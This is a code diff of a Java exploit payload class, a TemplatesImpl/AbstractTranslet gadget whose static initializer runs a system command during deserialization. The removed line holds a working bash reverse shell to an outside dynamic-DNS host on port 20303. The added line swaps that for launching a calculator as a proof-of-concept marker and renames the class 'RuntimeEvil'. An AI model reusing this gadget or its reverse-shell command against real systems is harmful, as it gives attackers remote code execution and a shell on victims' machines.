@@ -6,19 +6,19 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 
 import java.io.IOException;
 
-public class bash_shell extends AbstractTranslet {
+public class TemplatesImpl_RuntimeEvil extends AbstractTranslet {
     static{
         try {
-            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/9731pz95hm92.vicp.fun/20303 0>&1");
+            Runtime.getRuntime().exec("calc");
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
     }
+    public TemplatesImpl_RuntimeEvil(){}
     @Override
     public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
 
     }
-    public bash_shell(){}
 
     @Override
     public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
